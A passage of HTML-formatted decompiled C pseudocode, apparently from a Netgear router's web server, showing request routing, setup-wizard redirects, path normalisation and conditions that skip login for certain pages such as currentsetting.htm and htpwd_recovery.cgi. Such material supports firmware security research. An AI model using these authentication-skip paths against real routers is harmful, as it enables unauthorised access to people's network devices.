class="number">4</span>);</span><br><span class="line">    v75 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *v74 )</span><br><span class="line">    &#123;</span><br><span class="line">      v75 = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(host, v61) )</span><br><span class="line">      &#123;</span><br><span class="line">        v76 = nvram_get(<span class="string">&quot;wifi_ap_mode&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !v76 )</span><br><span class="line">          v76 = <span class="string">&quot;\r\n\r\n&quot;</span> + <span class="number">4</span>;</span><br><span class="line">        v75 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( atoi(v76) )</span><br><span class="line">        &#123;</span><br><span class="line">          v77 = host;</span><br><span class="line">          v78 = nvram_get(<span class="string">&quot;wifi_ap_name&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> ( !v78 )</span><br><span class="line">            v78 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">          v75 = strcasestr(v77, v78) != <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v79 = host;</span><br><span class="line">    v80 = nvram_get(<span class="string">&quot;lan_ipaddr&quot;</span>);</span><br><span class="line">    v81 = v79;</span><br><span class="line">    v72 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(v81, v80) &amp;&amp; !<span class="built_in">strstr</span>(host, <span class="string">&quot;routerlogin&quot;</span>) )</span><br><span class="line">      v72 = v75;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v66 = inet_ntoa(in);</span><br><span class="line">    v67 = strdup(v66);</span><br><span class="line">    v68 = host;</span><br><span class="line">    v70 = v67;</span><br><span class="line">    v69 = nvram_get(<span class="string">&quot;lan_ipaddr&quot;</span>);</span><br><span class="line">    v71 = v68;</span><br><span class="line">    v72 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(v71, v69) )</span><br><span class="line">    &#123;</span><br><span class="line">      v73 = host;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(host, <span class="string">&quot;routerlogin&quot;</span>) )</span><br><span class="line">        v72 = <span class="built_in">strstr</span>(v73, v70) != <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v82 = select_request_type(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( strcasecmp(v14, v82) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_203;</span><br><span class="line">  v83 = path;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(path, <span class="string">&quot;BRS_&quot;</span>)</span><br><span class="line">    || <span class="built_in">strstr</span>(v83, <span class="string">&quot;debug.htm&quot;</span>)</span><br><span class="line">    || <span class="built_in">strstr</span>(v83, <span class="string">&quot;currentsetting&quot;</span>)</span><br><span class="line">    || <span class="built_in">strstr</span>(v83, <span class="string">&quot;POT.htm&quot;</span>)</span><br><span class="line">    || !access(<span class="string">&quot;/tmp/wizard_vlan&quot;</span>, <span class="number">0</span>)</span><br><span class="line">    || !access(<span class="string">&quot;/tmp/conflict_warning&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_203;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v72 &amp;&amp; !(need_fakepath)(path) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_205;</span><br><span class="line">  <span class="keyword">if</span> ( access(<span class="string">&quot;/tmp/brs_gui_hijack&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v72 )</span><br><span class="line">      v84 = <span class="string">&quot;BRS_index.htm&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v84 = <span class="string">&quot;BRS_hijack_index.htm&quot;</span>;</span><br><span class="line">    <span class="built_in">sprintf</span>(temp_uri, <span class="string">&quot;/setup.cgi?next_file=%s HTTP/1.1&quot;</span>, v84);</span><br><span class="line">    path = temp_uri;</span><br><span class="line">LABEL_203:</span><br><span class="line">    <span class="keyword">if</span> ( !v72 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_204;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_205;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !v72 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sprintf</span>(temp_uri, <span class="string">&quot;/setup.cgi?next_file=%s HTTP/1.1&quot;</span>, <span class="string">&quot;BRS_hijack_success.htm&quot;</span>);</span><br><span class="line">    path = temp_uri;</span><br><span class="line">LABEL_204:</span><br><span class="line">    login_or_not = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_205:</span><br><span class="line">  v85 = nvram_get(<span class="string">&quot;config_state&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v85 )</span><br><span class="line">    v85 = (<span class="string">&quot;\r\n\r\n&quot;</span> + <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *v85 == <span class="string">&#x27;b&#x27;</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_211;</span><br><span class="line">  v86 = nvram_get(<span class="string">&quot;need_not_login&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v86 )</span><br><span class="line">    v86 = (<span class="string">&quot;\r\n\r\n&quot;</span> + <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *v86 == <span class="number">49</span> )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_211:</span><br><span class="line">    nvram_set(<span class="string">&quot;need_not_login&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">    nvram_set(<span class="string">&quot;start_in_blankstate&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (path_exist)(path, off_427E50, v14)</span><br><span class="line">    || (v87 = path, <span class="built_in">strstr</span>(path, <span class="string">&quot;htpwd_recovery.cgi&quot;</span>)) &amp;&amp; (v88 = select_request_type(<span class="number">3</span>), !strcasecmp(v14, v88))</span><br><span class="line">    || <span class="built_in">strstr</span>(v87, <span class="string">&quot;PNPX_GetShareFolderList&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    multi_login_flag = <span class="number">0</span>;</span><br><span class="line">    login_or_not = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strstr</span>(path, <span class="string">&quot;currentsetting.htm&quot;</span>) )</span><br><span class="line">      currentsetting_flag = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v89 = off_427E50;</span><br><span class="line">  v90 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( *v89 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strstr</span>(path, *v89) )</span><br><span class="line">      v90 = <span class="number">1</span>;</span><br><span class="line">    ++v89;</span><br><span class="line">  &#125;</span><br><span class="line">  v91 = nvram_get(<span class="string">&quot;openvpn_hijack&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v91 )</span><br><span class="line">    v91 = (<span class="string">&quot;\r\n\r\n&quot;</span> + <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *v91 == <span class="number">49</span> &amp;&amp; !do_ssl )</span><br><span class="line">  &#123;</span><br><span class="line">    v92 = select_request_type(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !strcasecmp(v14, v92) &amp;&amp; !v90 )</span><br><span class="line">    &#123;</span><br><span class="line">      v93 = path;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(path, <span class="string">&quot;.gif&quot;</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strstr</span>(v93, <span class="string">&quot;.css&quot;</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strstr</span>(v93, <span class="string">&quot;.js&quot;</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strstr</span>(v93, <span class="string">&quot;.xml&quot;</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strstr</span>(v93, <span class="string">&quot;.png&quot;</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strstr</span>(v93, <span class="string">&quot;.jpg&quot;</span>)</span><br><span class="line">        &amp;&amp; !currentsetting_flag )</span><br><span class="line">      &#123;</span><br><span class="line">        v94 = dword_429740;</span><br><span class="line">        <span class="keyword">if</span> ( !dword_429740 )</span><br><span class="line">          v94 = <span class="string">&quot;HTTP/1.1&quot;</span>;</span><br><span class="line">        dword_429740 = v94;</span><br><span class="line">        <span class="built_in">snprintf</span>(</span><br><span class="line">          v172,</span><br><span class="line">          <span class="number">0x64</span>u,</span><br><span class="line">          <span class="string">&quot;Location: http://www.routerlogin.net/setup.cgi?next_file=%s&quot;</span>,</span><br><span class="line">          <span class="string">&quot;openvpn_confirm_update.htm&quot;</span>);</span><br><span class="line">LABEL_255:</span><br><span class="line">        v20 = <span class="number">302</span>;</span><br><span class="line">        v21 = <span class="string">&quot;Found&quot;</span>;</span><br><span class="line">        v22 = v172;</span><br><span class="line">        v23 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_382;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v95 = nvram_get(<span class="string">&quot;tc_from_old&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v95 )</span><br><span class="line">    v95 = (<span class="string">&quot;\r\n\r\n&quot;</span> + <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *v95 == <span class="number">49</span> &amp;&amp; !do_ssl )</span><br><span class="line">  &#123;</span><br><span class="line">    v96 = select_request_type(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !strcasecmp(v14, v96) &amp;&amp; !v90 )</span><br><span class="line">    &#123;</span><br><span class="line">      v97 = path;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(path, <span class="string">&quot;.gif&quot;</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strstr</span>(v97, <span class="string">&quot;.css&quot;</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strstr</span>(v97, <span class="string">&quot;.js&quot;</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strstr</span>(v97, <span class="string">&quot;.xml&quot;</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strstr</span>(v97, <span class="string">&quot;.png&quot;</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strstr</span>(v97, <span class="string">&quot;.jpg&quot;</span>)</span><br><span class="line">        &amp;&amp; !currentsetting_flag )</span><br><span class="line">      &#123;</span><br><span class="line">        v98 = dword_429740;</span><br><span class="line">        <span class="keyword">if</span> ( !dword_429740 )</span><br><span class="line">          v98 = <span class="string">&quot;HTTP/1.1&quot;</span>;</span><br><span class="line">        dword_429740 = v98;</span><br><span class="line">        <span class="built_in">snprintf</span>(v172, <span class="number">0x64</span>u, <span class="string">&quot;Location: %s&quot;</span>, <span class="string">&quot;tc_exist_unit_hijack.htm&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_255;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v99 = path;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(path, <span class="string">&quot;.cgi&quot;</span>) &amp;&amp; <span class="built_in">strstr</span>(v99, <span class="string">&quot;.htm&quot;</span>) &amp;&amp; !<span class="built_in">strstr</span>(v99, <span class="string">&quot;shares&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v100 = <span class="built_in">strlen</span>(v99);</span><br><span class="line">    <span class="keyword">if</span> ( v100 &gt;= <span class="number">0x1E2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v20 = <span class="number">404</span>;</span><br><span class="line">      v21 = <span class="string">&quot;Not Found&quot;</span>;</span><br><span class="line">      v22 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">      v23 = <span class="string">&quot;No such file.&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_382;</span><br><span class="line">    &#125;</span><br><span class="line">    strlcpy(temp_uri, v99, v100 - <span class="number">8</span>);</span><br><span class="line">    v101 = <span class="built_in">strrchr</span>(temp_uri, <span class="number">47</span>);</span><br><span class="line">    strlcpy(byte_429AA4, temp_uri, v101 - temp_uri);</span><br><span class="line">    v102 = path;</span><br><span class="line">    <span class="keyword">if</span> ( *path == <span class="string">&#x27;/&#x27;</span> )</span><br><span class="line">      path = v102 + <span class="built_in">strlen</span>(byte_429AA4) + <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">snprintf</span>(temp_uri, <span class="number">0x200</span>u, <span class="string">&quot;%s/setup.cgi?next_file=%s&quot;</span>, byte_429AA4, path);</span><br><span class="line">    path = temp_uri;</span><br><span class="line">  &#125;</span><br><span class="line">  v103 = path;</span><br><span class="line">  path = v103 + <span class="built_in">strspn</span>(path, <span class="string">&quot; \t\n\r&quot;</span>);</span><br><span class="line">  v104 = <span class="built_in">strpbrk</span>(path, <span class="string">&quot; \t\n\r&quot;</span>);</span><br><span class="line">  dword_429740 = v104;</span><br><span class="line">  <span class="keyword">if</span> ( !v104 )</span><br><span class="line">  &#123;</span><br><span class="line">    v20 = <span class="number">400</span>;</span><br><span class="line">    v21 = <span class="string">&quot;Bad Request&quot;</span>;</span><br><span class="line">    v22 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_266;</span><br><span class="line">  &#125;</span><br><span class="line">  *v104 = <span class="number">0</span>;</span><br><span class="line">  dword_429740 = (v104 + <span class="number">1</span>);</span><br><span class="line">  v105 = <span class="built_in">strchr</span>(path, <span class="string">&#x27;?&#x27;</span>);</span><br><span class="line">  dword_42973C = v105;</span><br><span class="line">  <span class="keyword">if</span> ( v105 )</span><br><span class="line">  &#123;</span><br><span class="line">    *v105 = <span class="number">0</span>;</span><br><span class="line">    v106 = v105 + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v106 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  dword_42973C = v106;</span><br><span class="line">  v107 = select_request_type(<span class="number">1</span>);</span><br><span class="line">  v108 = strcasecmp(v14, v107) == <span class="number">0</span>;</span><br><span class="line">  v109 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !v108 )</span><br><span class="line">  &#123;</span><br><span class="line">    v110 = select_request_type(<span class="number">2</span>);</span><br><span class="line">    v108 = strcasecmp(v14, v110) == <span class="number">0</span>;</span><br><span class="line">    v109 = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v108 )</span><br><span class="line">    &#123;</span><br><span class="line">      v111 = select_request_type(<span class="number">3</span>);</span><br><span class="line">      v108 = strcasecmp(v14, v111) != <span class="number">0</span>;</span><br><span class="line">      v109 = <span class="number">3</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v108 )</span><br><span class="line">      &#123;</span><br><span class="line">        v20 = <span class="number">501</span>;</span><br><span class="line">        v21 = <span class="string">&quot;Not Implemented&quot;</span>;</span><br><span class="line">        v22 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        v23 = <span class="string">&quot;That method is not implemented.&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_382;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v112 = path;</span><br><span class="line">  dword_429730 = v109;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(path, <span class="string">&quot;%00&quot;</span>) || (sub_4062BC(v112, v112), v113 = path, *path != <span class="number">47</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v20 = <span class="number">400</span>;</span><br><span class="line">    v21 = <span class="string">&quot;Bad Request&quot;</span>;</span><br><span class="line">    v22 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    v23 = <span class="string">&quot;Bad filename.&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_382;</span><br><span class="line">  &#125;</span><br><span class="line">  v114 = path + <span class="number">1</span>;</span><br><span class="line">  dword_429734 = (path + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v117 = <span class="built_in">strstr</span>(v113 + <span class="number">1</span>, <span class="string">&quot;//&quot;</span>);</span><br><span class="line">    v118 = v117;</span><br><span class="line">    <span class="keyword">if</span> ( !v117 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">for</span> ( j = v117 + <span class="number">2</span>; *j == <span class="number">47</span>; ++j )</span><br><span class="line">      ;</span><br><span class="line">    HIDWORD(v182) = j;</span><br><span class="line">    v116 = <span class="built_in">strlen</span>(j);</span><br><span class="line">    memmove(v118 + <span class="number">1</span>, HIDWORD(v182), v116 + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( !<span class="built_in">strncmp</span>(v113 + <span class="number">1</span>, <span class="string">&quot;./&quot;</span>, <span class="number">2u</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v119 = <span class="built_in">strlen</span>(v113 + <span class="number">3</span>);</span><br><span class="line">    memmove((v113 + <span class="number">1</span>), v113 + <span class="number">3</span>, v119 + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v121 = <span class="built_in">strstr</span>(v113 + <span class="number">1</span>, <span class="string">&quot;/./&quot;</span>);</span><br><span class="line">    v122 = v121;</span><br><span class="line">    <span class="keyword">if</span> ( !v121 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    HIDWORD(v182) = v121 + <span class="number">2</span>;</span><br><span class="line">    v120 = <span class="built_in">strlen</span>(v121 + <span class="number">2</span>);</span><br><span class="line">    memmove(v122, HIDWORD(v182), v120 + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(v113 + <span class="number">1</span>, <span class="string">&quot;../&quot;</span>, <span class="number">3u</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v123 = <span class="built_in">strlen</span>(v113 + <span class="number">4</span>);</span><br><span class="line">      v124 = (v113 + <span class="number">1</span>);</span><br><span class="line">      v125 = v113 + <span class="number">4</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_299;</span><br><span class="line">    &#125;</span><br><span class="line">    v126 = <span class="built_in">strstr</span>(v113 + <span class="number">1</span>, <span class="string">&quot;/../&quot;</span>);</span><br><span class="line">    v127 = v126 - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v126 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">for</span> ( k = v127 &lt; v114; !k &amp;&amp; *v127 != <span class="number">47</span>; k = v127 &lt; v114 )</span><br><span class="line">      --v127;</span><br><span class="line">    LODWORD(v182) = v127;</span><br><span class="line">    HIDWORD(v182) = v126 + <span class="number">4</span>;</span><br><span class="line">    v123 = <span class="built_in">strlen</span>(v126 + <span class="number">4</span>);</span><br><span class="line">    v125 = HIDWORD(v182);</span><br><span class="line">    v124 = (v182 + <span class="number">1</span>);</span><br><span class="line">LABEL_299:</span><br><span class="line">    memmove(v124, v125, v123 + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_304:</span><br><span class="line">  v130 = <span class="built_in">strlen</span>(v113 + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v130 &gt;= <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v129 = (v114 + v130 - <span class="number">3</span> - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>((v114 + v130 - <span class="number">3</span>), <span class="string">&quot;/..&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( v129 &gt;= v114 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *v129 == <span class="number">47</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          *v129 = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_304;</span><br><span class="line">        &#125;</span><br><span class="line">        --v129;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !v113[<span class="number">1</span>] )</span><br><span class="line">    dword_429734 = <span class="string">&quot;./&quot;</span>;</span><br><span class="line">  v131 = dword_429734;</span><br><span class="line">  v132 = *dword_429734;</span><br><span class="line">  <span class="keyword">if</span> ( v132 == <span class="string">&#x27;/&#x27;</span> || v132 == <span class="string">&#x27;.&#x27;</span> &amp;&amp; dword_429734[<span class="number">1</span>] == <span class="string">&#x27;.&#x27;</span> &amp;&amp; (!dword_429734[<span class="number">2</span>] || dword_429734[<span class="number">2</span>] == <span class="string">&#x27;/&#x27;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v20 = <span class="number">400</span>;</span><br><span class="line">    v21 = <span class="string">&quot;Bad Request&quot;</span>;</span><br><span class="line">    v22 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    v23 = <span class="string">&quot;Illegal filename.&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_382;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( dword_4284D4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v133 = host;</span><br><span class="line">    <span class="keyword">if</span> ( !host )</span><br><span class="line">    &#123;</span><br><span class="line">      v169 = <span class="number">128</span>;</span><br><span class="line">      <span class="keyword">if</span> ( getsockname(fd, v177, &amp;v169) &gt;= <span class="number">0</span> )</span><br><span class="line">        v133 = ntoa(v177);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v133 = <span class="string">&quot;UNKNOWN_HOST&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    dword_429750 = v133;</span><br><span class="line">    v134 = v133;</span><br><span class="line">    <span class="keyword">for</span> ( l = dword_429750; ; ++l )</span><br><span class="line">    &#123;</span><br><span class="line">      v136 = *l;</span><br><span class="line">      v108 = v136 != <span class="number">0</span>;</span><br><span class="line">      v137 = <span class="number">2</span> * v136;</span><br><span class="line">      <span class="keyword">if</span> ( !v108 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (*(_ctype_b + v137) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">        *l = *(_ctype_tolower + v137);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">snprintf</span>(byte_429CA4, <span class="number">0x2710</span>u, <span class="string">&quot;%s/%s&quot;</span>, v134, v131);</span><br><span class="line">    dword_429734 = byte_429CA4;</span><br><span class="line">  &#125;</span><br><span class="line">  signal(<span class="number">14</span>, sub_407E44);</span><br><span class="line">  alarm(<span class="number">0x12C</span>u);</span><br><span class="line">  v170 = stat64(dword_429734, &amp;sb);</span><br><span class="line">  <span class="keyword">if</span> ( v170 &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v138 = dword_429734;</span><br><span class="line">    <span class="keyword">for</span> ( dword_429738 = &amp;v138[<span class="built_in">strlen</span>(dword_429734)]; ; *dword_429738 = <span class="number">47</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v139 = dword_429734;</span><br><span class="line">      v140 = dword_429738;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( dword_429734 &gt;= --v140 )</span><br><span class="line">        &#123;</span><br><span class="line">          dword_429738 = <span class="number">0</span>;</span><br><span class="line">          v141 = <span class="number">-1</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_334;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( *v140 != <span class="number">47</span> );</span><br><span class="line">      dword_429738 = v140;</span><br><span class="line">      *v140 = <span class="number">0</span>;</span><br><span class="line">      v141 = stat64(v139, &amp;sb);</span><br><span class="line">      <span class="keyword">if</span> ( v141 &gt;= <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ++dword_429738;</span><br><span class="line">LABEL_334:</span><br><span class="line">    v170 = v141;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v170 &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_371;</span><br><span class="line">  <span class="keyword">if</span> ( (!::haystack || !*::haystack) &amp;&amp; dword_429734 )</span><br><span class="line">  &#123;</span><br><span class="line">    v172[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    v172[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    v172[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    v172[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">    v172[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">    in.s_addr = <span class="number">0</span>;</span><br><span class="line">    v142 = nvram_get(<span class="string">&quot;product_name&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v142 )</span><br><span class="line">      v142 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="built_in">sprintf</span>(v172, <span class="string">&quot;NETGEAR_%s.cfg&quot;</span>, v142);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(dword_429734, v172) )</span><br><span class="line">    &#123;</span><br><span class="line">      v20 = <span class="number">403</span>;</span><br><span class="line">      v21 = <span class="string">&quot;Forbidden&quot;</span>;</span><br><span class="line">      v22 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">      v23 = <span class="string">&quot;HTML is illegal.&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_382;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v143 = dword_429734;</span><br><span class="line">  v144 = &amp;v143[<span class="built_in">strlen</span>(dword_429734)];</span><br><span class="line">  <span class="keyword">if</span> ( (dword_432B40 &amp; <span class="number">0xF000</span>) == <span class="number">0x4000</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(v144 - <span class="number">1</span>) == <span class="number">47</span> || dword_429738 )</span><br><span class="line">    &#123;</span><br><span class="line">      v146 = maybe_allow_uris;</span><br><span class="line">      <span class="keyword">while</span> ( v146 != v172 )</span><br><span class="line">      &#123;</span><br><span class="line">        LODWORD(v182) = dword_429734;</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(dword_429734, <span class="string">&quot;./&quot;</span>) )</span><br><span class="line">          <span class="built_in">snprintf</span>(v178, <span class="number">0x2710</span>u, <span class="string">&quot;%s&quot;</span>, *v146);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          <span class="built_in">snprintf</span>(v178, <span class="number">0x2710</span>u, <span class="string">&quot;%s%s&quot;</span>, v182, *v146);</span><br><span class="line">        <span class="keyword">if</span> ( is_usb_session )</span><br><span class="line">        &#123;</span><br><span class="line">          ++v146;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          ++v146;</span><br><span class="line">          <span class="keyword">if</span> ( stat64(v178, &amp;sb) &gt;= <span class="number">0</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            dword_429734 = v178;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_361;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      v147 = access(<span class="string">&quot;/tmp/http_disable_lan&quot;</span>, <span class="number">0</span>);</span><br><span class="line">      v149 = <span class="number">0x410000</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !v147 )</span><br><span class="line">      &#123;</span><br><span class="line">        v150 = nvram_get(<span class="string">&quot;lan_ipaddr&quot;</span>);</span><br><span class="line">        v152 = inet_network(v150);</span><br><span class="line">        v151 = nvram_get(<span class="string">&quot;lan_netmask&quot;</span>);</span><br><span class="line">        v154 = inet_network(v151);</span><br><span class="line">        v153 = inet_network(remote_ip);</span><br><span class="line">        v148 = <span class="number">0x410000</span>;</span><br><span class="line">        <span class="keyword">if</span> ( ((v153 ^ v152) &amp; v154) == <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v20 = <span class="number">503</span>;</span><br><span class="line">          v21 = <span class="string">&quot;The Share is not available&quot;</span>;</span><br><span class="line">LABEL_369:</span><br><span class="line">          v22 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">          v23 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_382;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span 